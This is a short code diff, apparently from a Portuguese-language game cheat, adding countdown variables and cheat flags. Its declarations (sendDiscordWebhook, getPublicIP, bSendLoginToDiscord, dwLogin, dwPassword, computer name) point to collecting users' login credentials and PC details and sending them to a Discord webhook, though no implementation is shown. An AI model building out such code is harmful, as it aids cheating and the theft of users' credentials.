@@ -65,6 +65,8 @@ std::string getPublicIP();
 void sendDiscordWebhook(std::string szMessage);
 
 //Registro
+bool bTime = false, bGetTime = false;
+
 std::string expireDate = "2024-01-13";
 std::string expireTime = "23:59:00";
 std::string dwNome;
@@ -73,12 +75,17 @@ std::vector<std::string> names;
 std::vector<std::string> serials;
 std::vector<std::string> dates;
 
+std::string strDays;
+std::string strHours;
+std::string strMinutes;
+std::string strSeconds;
+
 //Fim registro
 
 //Var
-extern bool bNoHp, bNoMp;
-bool bDisableAll = false, bFlag = false, bGetDadosPC = false, bSendDadosPCToDiscord = false, bSendLoginToDiscord = false;
-std::string dwLogin, dwPassword;
+extern bool bNoHp, bNoMp, bNoStm, bAutoBot;
+bool bDisableAll = false, bFlag = false, bGetDadosPC = false, bSendDadosPCToDiscord = false, bSendLoginToDiscord = false, bCheatThread = false;
+std::string dwLogin, dwPassword, dwServer;
 
 std::string computerName;
 std::string publicIP;
